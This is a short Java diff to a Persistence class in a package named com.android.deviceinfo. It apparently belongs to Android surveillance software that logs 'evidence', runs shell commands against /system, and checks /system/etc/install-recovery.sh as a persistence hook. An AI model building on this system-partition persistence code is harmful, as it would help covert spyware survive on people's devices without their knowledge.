@@ -1,5 +1,6 @@
 package com.android.deviceinfo;
 
+import java.io.File;
 import java.util.Random;
 
 import android.content.Context;
@@ -8,7 +9,8 @@ import android.content.pm.PackageManager.NameNotFoundException;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -117,9 +119,10 @@ public class Persistence {
 		// Return /system to normal
 		Execute.execute(Configuration.shellFile + " " + "blr");
 		
-		if(Cfg.DEBUG){
-			EvidenceReference.info("Persistence");
-		}
+		//AutoFile p = new AutoFile( M.e("/system/etc/install-recovery.sh" ));
+		//if(p.exists()){
+		//	EvidenceReference.info("Persistence");
+		//}
 	}
 	
 	public void removePersistance() {
